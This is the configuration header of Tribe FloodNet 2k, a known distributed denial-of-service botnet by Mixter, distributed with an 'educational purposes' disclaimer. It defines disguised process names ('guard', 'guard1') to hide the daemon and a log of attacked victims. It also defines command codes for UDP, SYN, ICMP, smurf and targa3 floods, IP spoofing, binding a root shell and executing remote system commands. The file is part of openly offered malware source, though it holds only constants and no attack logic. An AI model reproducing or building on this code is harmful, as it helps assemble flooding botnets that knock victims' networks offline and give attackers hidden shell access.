/*
 * Tribe FloodNet - 2k edition
 * by Mixter <mixter@newyorkoffice.com>
 *
 * config.h - user defined values
 *
 * This program is distributed for educational purposes and without any
 * explicit or implicit warranty; in no event shall the author or
 * contributors be liable for any direct, indirect or incidental damages
 * arising in any way out of the use of this software.
 *
 */

#ifndef _CONFIG_H

#define HIDEME "guard"	/* background process name */
#define HIDEKIDS "guard1"	/* flood/shell thread names */
#define CHLD_MAX 5		/* maximum targets a server handles at a time */
#define DELIMITER "@"		/* to separate ips and broadcasts (host1@host2@...) */
#if 0
#define REQUIRE_PASS		/* require server password to be entered and
				   verified before the client will work? */
#endif

#define ATTACKLOG "attack.log"	/* keep server side logs of attacked victims */

/* Note: the password is not defined here, but at compile time. The
   requests will be encrypted anyways, you DON'T need to change this */

#define PROTO_SEP	'+'	/* session header separator, can be anything */
#define ID_SHELL	'a'	/* to bind a root shell */
#define ID_PSIZE	'b'	/* to change size of udp/icmp packets */
#define ID_SWITCH	'c'	/* to switch spoofing mode */
#define ID_STOPIT	'd'	/* to stop flooding */
#define ID_SENDUDP	'e'	/* to udp flood */
#define ID_SENDSYN	'f'	/* to syn flood */
#define ID_SYNPORT	'g'	/* to set port */
#define ID_ICMP		'h'	/* to icmp flood */
#define ID_SMURF	'i'	/* haps! haps! */
#define ID_TARGA	'j'	/* targa3 (ip stack penetration) */
#define ID_MIX		'k'	/* udp/syn/icmp intervals */
#define ID_REXEC	'l'	/* execute system command */

#define _CONFIG_H
#endif
